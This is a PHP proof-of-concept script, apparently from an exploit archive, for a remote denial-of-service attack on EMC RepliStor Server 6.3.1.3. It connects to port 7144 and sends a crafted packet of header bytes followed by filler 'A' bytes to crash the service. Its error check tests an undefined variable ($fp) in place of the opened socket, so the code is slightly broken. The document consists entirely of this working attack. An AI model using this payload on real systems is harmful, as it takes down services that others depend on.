<?php
    /*
    EMC RepliStor Server (rep_serv.exe) 6.3.1.3 remote denial of
    service poc
    by Nine:Situations:Group::bellick

    */

    $host = "192.168.0.1";
    $port = 7144;

    $_sock = fsockopen($host, $port, $errno, $errstr, 2);
    if (!$fp) {
        echo "$errstr ($errno)\n";
    } else {
        $_p = "\x54\x93\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41". "\x41\x41\x41\x41";
        fputs($_sock, $_p);
        fclose($_sock);
    }
?>